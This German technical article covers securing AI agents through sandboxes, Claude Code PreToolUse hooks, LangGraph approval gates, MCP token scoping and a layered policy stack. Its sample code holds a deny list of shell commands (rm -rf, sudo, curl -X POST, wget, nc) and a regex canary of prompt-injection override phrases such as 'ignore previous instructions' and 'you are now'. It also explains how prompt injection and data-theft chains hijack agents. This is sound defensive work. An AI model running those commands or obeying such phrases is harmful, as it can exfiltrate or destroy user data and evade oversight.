  • OpenSandbox von Alibaba ermöglicht die Wahl der Runtime – gVisor, Kata oder Firecracker – hinter einem SDK.
  • Microsofts Agent Governance Toolkit (MIT-lizenziert, April 2026) ergänzt eine Runtime Policy Engine. Enforcement im Sub-Millisekundenbereich, direkt auf die OWASP ASI Top 10 ausgerichtet.

Wählen Sie das Isolationsniveau anhand von Code-Trust-Level, Tenant Boundary, Netzwerkzugriff, Host-Daten und Recovery-Kosten. Namespace- und seccomp-Controls können für vertrauenswürdige interne Tools ausreichen. LLM-generierter Code und nicht vertrauenswürdige Packages benötigen eine stärkere Boundary wie gVisor, Kata oder eine MicroVM. Anschließend müssen Sie die Escape- und Exfiltration-Pfade gegen Ihr eigenes Threat Model testen.

Claude Code und Codex haben aus demselben Menü wie alle anderen gewählt. Sie haben die Komponenten lediglich unterschiedlich verpackt.

PreToolUse-Hooks als programmierbare Policy

Modes und Allowlists decken einfache Fälle ab: „Der Agent darf Dateien editieren, aber kein Bash ausführen“, „Alles blockieren, was wie rm -rf aussieht.“ Sie scheitern, sobald Ihre Policy echte Logik benötigt. Sie wollen git push nur blockieren, wenn der Branch main ist. Sie wollen jedes Edit ablehnen, das eine Datei berührt, die einem Secret-Regex entspricht. Sie wollen Shell Calls pro Session rate-limiten oder jede Tool Invocation in Ihren zentralen Audit Log schreiben (das SIEM, also das Security Information and Event Management System, das Ihr Security-Team ohnehin überwacht).

Nichts davon passt in eine statische Allowlist. Dafür gibt es Hooks – Shell Commands, die Claude Code an bestimmten Punkten im Tool-Call-Lifecycle ausführt und die den ausstehenden Call untersuchen sowie ein strukturiertes Allow/Deny zurückgeben können. Claude Code stellt ungefähr dreißig Lifecycle Events bereit (die vollständige Liste steht in der Dokumentation); eines davon ordnet alles andere neu: Ein PreToolUse-Hook, der permissionDecision: "deny" zurückgibt, blockiert ein Tool unabhängig vom Mode.

Die Struktur der Settings:

{
    "permissions": {
        "defaultMode": "acceptEdits",
        "deny": ["Bash(rm -rf:*)", "Bash(sudo:*)", "Read(.env*)"]
    },
    "hooks": {
        "PreToolUse": [
            {
                "matcher": "Bash",
                "hooks": [
                    {
                        "type": "command",
                        "command": ".claude/hooks/pre-bash-firewall.sh"
                    }
                ]
            },
            {
                "matcher": "Edit|Write",
                "hooks": [
                    {
                        "type": "command",
                        "command": ".claude/hooks/protect-paths.sh"
                    }
                ]
            }
        ]
    }
}

Ein Hook kann ein Shell Script mit fünf Zeilen oder eine vollständige Policy Engine sein. Entscheidend ist die Rückgabeform:

{
    "hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "deny",
        "permissionDecisionReason": "writes outside workspace prohibited"
    }
}

Das Model sieht ein strukturiertes Deny. Der Reasoning Loop aus Teil 1 verarbeitet es wie jede andere Tool Observation: Die Ablehnung wird zum Context, der Agent plant neu, der Loop läuft weiter. Das ist der Vorteil von „Permission ist Infrastructure“. Das Deny ist in denselben Mechanismus eingebunden, der auch einen 500er von einem HTTP-Tool verarbeitet. Es handelt sich nicht um einen separaten Security Workflow, der nachträglich angebaut werden muss.

Ein häufiges Anti-Pattern besteht darin, einen System Prompt zu schreiben, der sagt „Lösche keine Dateien ohne ausdrückliche User-Bestätigung“, den Agent auszuliefern und diese Anweisung als Control zu behandeln. Ein injizierter Prompt oder ein vom Angreifer kontrolliertes Tool Result kann diese Anweisung umgehen. Das Model ist keine Policy Engine. Es kann dem von Ihnen geschriebenen Pattern folgen – oder einem vom Angreifer gelieferten.

Human Approval funktioniert nur als Escalation

Byte says

Ich führte eine Session mit einer Bestätigungsabfrage für jeden Befehl aus. Beim zwanzigsten Prompt klickte ich auf „Approve“, ohne zu lesen. Ein Gate, das immer auslöst, ist nur ein Button.

Die Content-Filter-Layer umschließt den Model Call und überwacht, was er sagt. Permission Ladders laufen vor dem Tool und beobachten, was es zu tun versucht. Die dritte Layer, die auffängt, was die ersten beiden übersehen haben, ist der Mensch. Richtig umgesetzt ist Human-in-the-Loop-Review (HITL) ein Escalation Channel. Schlecht umgesetzt ist es ein Dialogfeld, das in 93 % der Fälle bestätigt wird.

LangGraph liefert das Pause/Resume-Primitive. HumanLayer verpackt den Approval Channel, und Anthropics Nutzungsdaten zeigen, warum Anzahl und Qualität der Escalations gemessen werden müssen.

Das LangGraph-Primitive

LangGraphs interrupt() + Command(resume=value) pausiert einen Graph, persistiert seinen State über den konfigurierten Checkpointer und setzt ihn mit einem vom Menschen gelieferten Wert fort. Ob dieses Resume sicher ist, hängt von einem Detail in der Dokumentation ab:

„Wenn die Execution fortgesetzt wird (nachdem Sie den angeforderten Input bereitgestellt haben), startet die Runtime den gesamten Node von Anfang an neu – sie setzt nicht exakt an der Zeile fort, an der interrupt aufgerufen wurde.“

Aus diesem Restart-Verhalten folgen drei Constraints:

1. Side Effects vor interrupt() müssen idempotent sein. Wenn der Mensch antwortet, läuft der gesamte Node wieder von oben, nicht ab der Zeile mit interrupt(). Wenn Ihr Node also eine E-Mail sendet, auf Approval wartet und anschließend „gesendet“ zurückgibt, wird die E-Mail beim Resume ein zweites Mal gesendet. Abhilfe: Side Effects nach dem Interrupt platzieren oder sie wiederholbar machen (Deduplication Keys, Upsert statt Insert, Caching nach Message ID).

2. Interrupts werden nach Index, nicht nach Name, Resumes zugeordnet. Wenn ein einzelner Node zwei interrupt()-Calls enthält, ordnet LangGraph sie den Command(resume=...)-Werten in der Reihenfolge ihres Auftretens zu. Jede Verzweigung, die die Anzahl der ausgeführten Interrupts ändert (ein if, das beim Resume einen Interrupt überspringt, oder eine Schleife mit einer anderen Anzahl von Iterationen), bringt die Indizes durcheinander. Dadurch kann ein Resume-Wert beim falschen Interrupt landen.

3. Payloads müssen JSON-sicher bleiben. Die LangGraph-Dokumentation verlangt JSON-serialisierbare Werte für interrupt() und Resume-Payloads. Verwenden Sie Strings, Zahlen, Booleans, Arrays und Dictionaries, die solche Werte enthalten. Vermeiden Sie Functions, Class Instances und andere komplexe Objekte, weil die Serialisierung vom konfigurierten Checkpointer abhängt. Wandeln Sie Approval-Daten in Dictionaries und Primitives um, bevor Sie sie an interrupt() übergeben oder über eine HTTP API bereitstellen.

Die drei kanonischen Patterns:

# No-run: illustrative LangGraph sketches; requires LangGraph, a tool decorator, interrupt, and smtp_send.
# (a) Approval gate
@tool
def send_email(to, subject, body):
    resp = interrupt({"action": "send_email", "to": to,
                      "subject": subject, "body": body})
    if resp.get("action") == "approve":
        return smtp_send(to, subject, body)
    return "Email cancelled"

# (b) Edit-and-continue
def review_node(state):
    edited = interrupt({"content": state["generated_text"]})
    return {"generated_text": edited}

# (c) Mid-run state correction — conditional edge
class AgeState(TypedDict):
    age: int | None
    pending_question: str | None

def get_age_node(state: AgeState):
    question = state.get("pending_question") or "What is your age?"
    answer = interrupt(question)  # once per node invocation
    if isinstance(answer, int) and answer > 0:
        return {"age": answer, "pending_question": None}
    return {"pending_question": f"'{answer}' is not valid. Please enter a positive number."}

def route_age(state: AgeState):
    return END if state.get("age") is not None else "get_age"

builder = StateGraph(AgeState)
builder.add_node("get_age", get_age_node)
builder.add_edge(START, "get_age")
builder.add_conditional_edges("get_age", route_age)

Resume ist graph.invoke(Command(resume={"action": "approve"}), config=cfg). LangGraph 0.4+ unterstützt ein Dictionary-basiertes Multi-Interrupt-Resume für parallele Branches – relevant, sobald Ihr Agent fan-out betreibt.

HumanLayer: Approval als Produkt

HumanLayer ist die Managed-Variante desselben Konzepts. Sie dekorieren eine Function, und Approval Requests werden mit Regeln dafür, wer benachrichtigt wird, an Slack, E-Mail oder Discord geroutet. Wenn der Agent versucht, multiply(2, 5) aufzurufen, sehen die Logs so aus:

last message led to 1 tool calls: [('multiply', '{"x":2,"y":5}')]
HumanLayer: waiting for approval for multiply

Der Approver klickt in Slack auf Approve oder Deny. Bei einem Deny formuliert die HumanLayer-Dokumentation es so: „HumanLayer gibt Ihr Feedback an den Agent weiter, der seinen Ansatz daraufhin anpassen kann.“ Dieser letzte Teil unterscheidet eine echte HITL-Layer von einem glorifizierten Bestätigungsdialog. Der Mensch wird zu einem Signal, über das der Agent im selben Loop Reasoning betreibt, statt zu einem Gate, das nur Ja oder Nein kennt.

Approval Fatigue in den Daten

Anthropic veröffentlichte die echten Daten im Februar 2026. Drei Ergebnisse sind wichtiger als die übrigen.

„Wir stellten fest, dass 80 % der Tool Calls von Agents stammen, die offenbar mindestens eine Art von Safeguard besitzen (etwa eingeschränkte Permissions oder Human-Approval-Requirements), 73 % offenbar in irgendeiner Form einen Human-in-the-Loop haben und nur 0,8 % der Aktionen offenbar irreversibel sind.“

Das sind die guten Nachrichten. Betrachten Sie 80 % als obere Grenze, weil Anthropics Fußnote 14 ergänzt: „Claude überschätzte die menschliche Beteiligung häufig, daher erwarten wir, dass 80 % eine obere Grenze darstellen.“

„Neuere User (<50 Sessions) verwenden Full Auto-Approve ungefähr in 20 % der Fälle; bei 750 Sessions steigt dieser Wert auf über 40 % der Sessions.“

Das ist der Drift. User beginnen vorsichtig und werden weniger vorsichtig, sobald sie Vertrauen in das Tool aufbauen. So verhalten sich Menschen, und das ist kein Charakterfehler. Es ist ein Telemetrie-Signal, das Ihr System verfolgen sollte. (Eine kleine Fact-Checking-Notiz: In der Sekundärberichterstattung wurde dies häufig als „20 % → über 50 %“ zitiert. Gegenüber Anthropics Primärdaten lautet die verifizierte Zahl 20 % → über 40 %. Falls Sie die 50-%-Zahl gesehen haben: Daher stammt sie.)

Anthropics Engineering-Post vom März 2026 zu Claude Codes Auto Mode nennt die entscheidende Zahl:

„Claude-Code-User genehmigen 93 % der Permission Prompts. Wir haben Classifier gebaut, um einige Entscheidungen zu automatisieren, die Safety zu erhöhen und gleichzeitig Approval Fatigue zu reduzieren … Wenn eine Session drei aufeinanderfolgende Denials oder insgesamt 20 erreicht, stoppen wir das Model und eskalieren an den Menschen.“

Wenn ein Dialog neun von zehn Mal bestätigt wird, ist er kein verlässliches Security Control mehr. Er ist Telemetrie. User haben gelernt, ihn wegzuklicken. Anthropics Antwort ist architektonisch. Ein zweistufiger Classifier (schneller Single-Token-Filter, danach Chain-of-Thought nur bei einem Flag, 0,4 % False-Positive-Rate) entfernt Approval Prompts für Low-Risk-Actions und stoppt den gesamten Loop, wenn sich Denials häufen.

Qualität der Escalation messen

Routine- und reversible Aktionen sollten Sie allowlisten und loggen. Eskalieren Sie Aktionen, deren Side Effects eine Boundary überschreiten, die die Runtime nicht rückgängig machen kann, etwa eine externe Message, einen Production Write, einen Force Push oder eine Zahlung. Anthropic beschreibt das Ziel so, dass ein Mensch eingreifen können muss, wenn eine Entscheidung reale Konsequenzen hat.

Verfolgen Sie den vollständigen Funnel, statt ein fremdes Approval-Rate-Ziel zu übernehmen: vorgeschlagene Aktionen, automatische Allows, Escalations, Approvals, Denials, Edits und Incidents nach einem Approval. Eine hohe Approval Rate kann bedeuten, dass die Prompts routinemäßiges Rauschen sind. Eine hohe Denial- oder Edit-Rate kann bedeuten, dass der Planner die falsche Aktion vorschlägt oder die für einen Approver notwendigen Informationen nicht sichtbar macht. Der sinnvolle Schwellenwert hängt von der Action Class und den Kosten eines False Allow ab; leiten Sie ihn daher aus Ihren eigenen Incident- und Review-Daten ab.

MCP Scoping und die Supply Chain

MCP verbindet Agents mit externen Tools wie Slack, GitHub und Datenbanken. Dadurch wird sein Authorization Model Teil der Security Boundary. Die Spec-Revisions von 2025 trennten Token-Issuer- und Resource-Server-Rollen und ergänzten Resource Indicators. Diese Historie erklärt, welche Audience- und Forwarding-Checks ein Server heute durchsetzen muss.

MCP Authorization in drei Revisionen

Die Spec vom 26.03.2025 schrieb OAuth 2.1 mit PKCE (Proof Key for Code Exchange) vor, den Standard-Flow für Public Clients. Dieser Teil war korrekt, aber die Spec war auf subtile und gefährliche Weise unvollständig. Sie verwischte zwei unterschiedliche Rollen, die ein MCP Server spielen konnte. Der Authorization Server stellt Tokens aus. Der Resource Server akzeptiert sie. Wenn ein Server beides übernimmt und einen Request an einen anderen Server weiterleitet, kann dasselbe Credential an einen Ort gelangen, für den es nie bestimmt war. Das ist die Lücke.

Die Revision vom 18.06.2025 trennte die Rollen. Ein MCP Server fungiert als OAuth Resource Server, während ein externer Authorization Server das Token ausstellt. RFC 8707 Resource Indicators binden das Token an eine Ziel-Resource, und RFC 9728 Protected Resource Metadata gibt dem Client einen expliziten Discovery-Pfad. Die Spec verbietet außerdem, dass ein MCP Server das Token eines Clients upstream weiterleitet.

Die Revision vom 25.11.2025 behielt diese Trennung bei und arbeitete an den Teilen, die ein Client korrekt implementieren muss. Die Discovery des Authorization Servers erhielt OpenID Connect Discovery, sodass ein Client den richtigen Issuer finden kann, statt ihn zu erraten. Incremental Scope Consent wechselte in den WWW-Authenticate-Header. Dadurch kann ein Server bei Bedarf einen zusätzlichen Scope anfordern, statt von Anfang an alles zu verlangen. Die Client Registration erhielt OAuth Client ID Metadata Documents als empfohlenen Mechanismus und ersetzte damit Dynamic Registration für die meisten Deployments. Auch die Discovery von Protected Resource Metadata wurde an RFC 9728 angepasst; dadurch ist WWW-Authenticate optional, mit einem .well-known-Fallback.

Prüfen Sie vor der Implementierung die Versioning-Seite. Im August 2026 lautet die aktuelle Revision 2026-07-28. Sie verlangt, dass jeder Request die Protocol-Version deklariert, und erlaubt dem Server, jeden Request unabhängig zu akzeptieren oder abzulehnen. Ein Client kann per server/discover vorab eine Version auswählen, aber Discovery ist optional. Die Deklaration und Negotiation pro Request bleiben erforderlich – auch wenn der Client einen Unsupported-Version-Fehler behandelt und mit einer gegenseitig unterstützten Version erneut versucht.

Audience Binding begrenzt Replay gegen den falschen MCP Server. Es neutralisiert nicht den übrigen Claude-Code-Angriffsweg: Ein Host-seitiger Hook kann weiterhin vor dem Start des Models ausgeführt werden, und ein nicht vertrauenswürdiges Projekt kann weiterhin versuchen, die lokale Konfiguration zu ändern. Token Scoping, Project Trust, Hook Policy und Sandboxing bleiben separate Controls.

Die MCP-Checkliste für 2026

Wenn Sie MCP in Production ausliefern oder verwenden:

  1. Authentication ist nicht optional. Beim Azure-MCP-Server-CVE fehlte Auth. Wenn Ihr Server Traffic akzeptiert, ohne ein Token zu verifizieren, haben Sie ein Tool gebaut, das jeder Angreifer im selben Netzwerk aufrufen kann.
  2. Tokens sind Audience-bound. Fordern Sie ein Token für die Ziel-MCP-Resource an und validieren Sie, dass das vorgelegte Token Ihren Server als Audience nennt. Lehnen Sie Tokens ab, die für eine andere Resource ausgestellt wurden.
  3. Geben Sie jedem Tool nur die Permissions, die es tatsächlich benötigt. Permissions liegen auf dem Server, nicht auf dem Tool. Wenn ein Slack MCP Server die Permission zum Posten von Messages erhält (chat:write), erben alle Slack Tools auf diesem Server diese Permission – einschließlich der Tools, die nur lesen sollten. Teilen Sie sie nach Möglichkeit auf separate Server auf, damit ein Bug in einem Tool nicht unbemerkt eine Permission verwenden kann, die es nie benötigt hat.
  4. Verwenden Sie frische, kurzlebige Tokens statt permanenter API Keys. Das Vault-Pattern von Claude Managed Agents (Anthropic Engineering) ist die Referenz: Der Agent selbst sieht die echten Credentials nie. Ein Middleman-Service hält sie, ruft im Moment eines Tool Calls ein frisches Token ab, verwendet es stellvertretend für den Agent und gibt nur das Result zurück.

Supply-Chain-Controls gelten weiterhin

Die Axios- und Trivy-Incidents sind bekannte Package- und CI-Supply-Chain-Fehler, angewandt auf Systeme, die die Installation von Dependencies automatisieren. Automation erhöht Anzahl und Geschwindigkeit der Executions. Deshalb müssen Version-, Provenance- und Review-Controls greifen, bevor der generierte Command CI oder eine Sandbox erreicht.

Die Defense ist unkompliziert:

  • Pinnen Sie Versionen in der Lockfile. Agents dürfen niemals eine Floating Version auflösen – kein @latest, kein npm update, kein --upgrade.
  • Scannen Sie in CI mit Tools, die unabhängig von der geprüften Komponente sind.
  • Verwenden Sie GitHub-Commit-SHAs für Actions, keine Tags.
  • Prüfen Sie Dependency-Diffs in Agent-gesteuerten PRs vor dem Merge.

Das sind Standard-Supply-Chain-Controls. Agent Automation verändert ihre Häufigkeit, nicht ihren Mechanismus.

Ein Policy Stack für den Market Analyst Agent

Der Market Analyst Agent aus Teil 1 ist ein kleiner LangGraph Agent, der Marktdaten abruft und einen Analystenbericht schreibt – aber nicht so klein, wie diese Beschreibung vermuten lässt. Zusätzlich zu den Market-Data-Tools führt er eine Allowlisted CLI über subprocess aus, evaluiert vom Model geschriebenes Python In-Process und kann einen Trade platzieren. Das sind drei Capability-Klassen, um die es in diesem Artikel geht, in einem Agent, den niemand als riskant bezeichnen würde. So sieht ein minimaler Policy Stack dafür aus.

Layer 1: Ein PreToolUse-Hook, der vor der Execution ablehnt

Selbst ein Agent, der „nur Aktiendaten liest“, kann nach Dingen greifen, die er nicht sollte: ein curl zu einer vom Angreifer kontrollierten URL, Writes außerhalb des Workspace, git-Mutations am Host-Repository. Eine Deny Rule ist Infrastructure, kein Prompt. Die folgende Skizze gibt die eigene Decision Shape des Agents zurück, nicht die umschließende hookSpecificOutput-Envelope, die Claude Code erwartet.

# agent/permissions.py
from pathlib import Path

DENY_COMMANDS = frozenset({
    "rm -rf", "sudo", "chmod 777",
    "curl -X POST", "wget", "nc ",
})
WORKSPACE = Path("./workspace").resolve()

def _outside_workspace(path: str) -> bool:
    # Resolve first: "~/.ssh/id_rsa" and "workspace/../../etc" both
    # have to become real paths before the comparison means anything.
    return not Path(path).expanduser().resolve().is_relative_to(WORKSPACE)

def pre_tool_use(tool_name: str, args: dict) -> dict | None:
    if tool_name == "shell":
        cmd = args.get("command", "")
        if any(bad in cmd for bad in DENY_COMMANDS):
            return {"permissionDecision": "deny",
                    "reason": f"command pattern disallowed: {cmd!r}"}
    if tool_name == "write_file":
        path = args.get("path", "")
        if _outside_workspace(path):
            return {"permissionDecision": "deny",
                    "reason": f"path outside workspace: {path!r}"}
    return None  # fall through to mode / canUseTool

Die Skizze macht den Control Point sichtbar. Der Hook gibt ein strukturiertes Deny zurück, und der Reasoning Loop erhält diese Ablehnung als Tool Observation.

Der Path Check ist eine Allowlist: eine Workspace Root, alles andere wird abgelehnt. Eine Denylist verbotener Präfixe blockiert nur Pfade, an die Sie gedacht haben. ~/.ssh/id_rsa wird nie genau so geschrieben, wie Sie es notiert haben. Der Command Check ist weiterhin eine Denylist. Substring Matching ist keine Production Shell Policy. Eine echte Implementierung sollte den Command parsen und sich bei der Execution auf die OS-Sandbox verlassen.

Layer 2: Ein Input-Canary für Prompt Injection

Agent-Goal-Hijacking (ASI01) gelangt häufig über eine abgerufene Webseite, eine User Message oder ein Research-Paper-PDF ins System. Ein einfacher Regex-Canary erkennt wörtliche Instruction Patterns und erzeugt ein nützliches Telemetry Event. Obfuskierte, mehrsprachige und kontextabhängige Injections wird er übersehen; daher kann er nicht als Decision Boundary dienen:

# agent/input_canary.py
import re

INJECTION_PATTERNS = [
    re.compile(r"ignore\s+(?:all\s+|any\s+|the\s+)?"
               r"(?:previous\s+|prior\s+|above\s+|earlier\s+)?"
               r"(?:instructions|rules|prompts?)",
               re.IGNORECASE),
    re.compile(r"you are now|act as|roleplay as", re.IGNORECASE),
    re.compile(r"system[ _:]*prompt", re.IGNORECASE),
    re.compile(r"<\|im_(start|end)\|>"),
]

def input_canary(text: str) -> dict | None:
    for pat in INJECTION_PATTERNS:
        m = pat.search(text)
        if m:
            return {"flag": "possible_injection", "match": m.group(0)}
    return None

Loggen Sie markierte Inputs; lehnen Sie sie nicht automatisch ab. False Positives sind bei einem Research Assistant teuer. Das Log ermöglicht Ihnen jedoch zu erkennen, wenn die Zahl der Flags bei einem User plötzlich ansteigt.

Layer 3: Structured-Output-Validation über einen Stop-Hook

Ein Pydantic Model plus ein Stop-Hook liefert für die Report-Generierung einen engen Validate-then-Retry-Loop. Der Agent kann nicht „done“ melden, bevor der Output die Schema-Validation und einen Smoke Test bestanden hat:

# No-run: illustrative policy sketch; requires Pydantic and the repo-local agent.schemas module.
# agent/stop_hook.py
from pydantic import ValidationError
from agent.schemas import MarketReport

def on_stop(final_output: str) -> dict:
    try:
        report = MarketReport.model_validate_json(final_output)
    except ValidationError as e:
        return {"decision": "continue",
                "feedback": f"schema invalid: {e.errors()[:3]}"}
    if not report.tickers:
        return {"decision": "continue",
                "feedback": "no tickers in report — did you skip the snapshot step?"}
    return {"decision": "allow_stop"}

Ein Schema Check und ein Smoke Test machen den Unterschied zwischen „Der Agent hat gesagt, dass er fertig ist“ und „Der Output ist tatsächlich ein Report“.

Layer 4: Ein Interrupt Gate für Outbound Actions

Der Market Analyst besitzt bereits ein irreversibles Tool, execute_trade. Jedes Outbound Tool, das hinzukommt – E-Mail, Slack, ein Report an einen Kunden –, gehört in dieselbe Kategorie. Das Pattern ändert sich mit dem Tool nicht. Verpacken Sie es in interrupt():

# No-run: illustrative outbound-tool sketch; requires LangGraph, a tool decorator, and smtp_send.
# agent/tools/notify.py
from langgraph.types import interrupt

@tool
def send_report(to: str, body: str):
    resp = interrupt({
        "action": "send_report",
        "to": to,
        "body_preview": body[:400],
    })
    if resp.get("action") == "approve":
        return smtp_send(to, body)
    return "send cancelled by human"

Outbound Actions vervollständigen die lethal trifecta. Setzen Sie explizite Gates, wenn Destination oder Content den normalen Blast Radius des Agents überschreiten. Messages an Finance, Kunden oder externe Empfänger sollten ausreichend Preview und Provenance enthalten, damit der Approver versteht, was gesendet wird.

Was dieser Stack nicht leistet

Dies ist keine Defense gegen:

  • Eine kompromittierte Upstream-Dependency (Axios-Klasse). Der Agent führt aus, was uv sync zum Ausführen vorgibt.
  • Eine schädliche .mcp.json in einem geclonten Repository (CVE-2025-59536-Klasse). Das wird im Permission Model des Host-MCP-Clients abgefangen, nicht im Code des Agents.
  • Eine Data-Theft-Chain aus legitimen Tools (EchoLeak-Klasse) – der Agent liest private Daten, ruft externe URLs ab und sendet Messages nach außen. Dafür brauchen Sie das Trifecta-Framing: Kombinieren Sie diese drei Capabilities überhaupt nicht.
  • Einen Escape aus execute_python_analysis, dem In-Process-Python-Evaluator des Agents. Er blockiert eine Liste von Statement-Typen, lehnt alle Identifier ab, die mit einem Unterstrich beginnen, und erlaubt Imports nur aus json, math und statistics. Aber exec im Worker-Prozess ist keine Boundary: Ein Bypass läuft mit den File Handles und dem Netzwerkzugriff des Workers. Verschieben Sie ihn in einen Subprocess mit CPU- und Memory-Limits, bevor er irgendetwas evaluiert, das von einer nicht vertrauenswürdigen Quelle beeinflusst wurde.

Diese vier Layers sind lokale Policy, und lokale Policy ist die innerste Layer, die Sie kontrollieren – nicht die einzige. Jeder Punkt dieser Liste muss an anderer Stelle abgefangen werden: in der Lockfile, im MCP Client, an der Process Boundary um generierten Code oder durch die Entscheidung, einem einzelnen Agent nicht alle drei Trifecta-Capabilities zu geben.

Die wichtigsten Erkenntnisse

  1. Content Filter und Execution Policy schützen unterschiedliche Boundaries. Filter untersuchen Model Input und Output. Tool Authorization, Credential Scope, Sandboxes und Supply-Chain-Controls greifen auf den Pfaden, die in den sechs Incidents verwendet wurden.
  2. Die meisten OWASP-ASI-Kategorien erfordern Controls außerhalb des Model Outputs. Verwenden Sie die Liste, um jede Threat-Kategorie der Komponente zuzuordnen, die sie tatsächlich blockieren oder aufzeichnen kann.
  3. Permission ist Infrastructure, kein Prompt. Claude Code dokumentiert die Precedence von Deny-, Ask- und Allow-Rules, während PreToolUse vor der Execution blockieren kann. Das Claude Agent SDK stellt einen separaten canUseTool-Pfad bereit. Andere Runtimes benötigen ein ebenso testbares Precedence Model.
  4. Behandeln Sie das strukturierte Deny eines PreToolUse-Hooks wie jede andere Tool Observation. Der Reasoning Loop verarbeitet es bereits. Sie benötigen keinen separaten Security Workflow.
  5. Eine Approval Rate von 93 % ist ein Signal, Prompt-Qualität und Escalation-Frequenz zu untersuchen. Tracken Sie Edits, Denials und Incidents nach dem Approval, statt ein universelles Ziel zu kopieren.
  6. Audience-bound Tokens und Per-Session-Vaults begrenzen Credential Replay und Exposure. Sie ersetzen weder Project Trust noch Hook Policy oder Sandboxing.
  7. Supply-Chain-Checks müssen mit Automation Speed laufen. Pinnen Sie Versionen und Actions-SHAs, scannen Sie in CI und prüfen Sie Dependency-Änderungen in von Agents verfassten Pull Requests.
  8. Bauen Sie die Policy Layer so, dass ein neuer Product Launch sie nicht entwertet. OpenAI Agents SDK, Codex CLI und Claude Code drücken dieselben Primitives unterschiedlich aus. Die Primitives (Permission Ladders, Hooks, Sandboxes, Interrupts, Audience-bound Tokens) sind die eigentliche Wette.
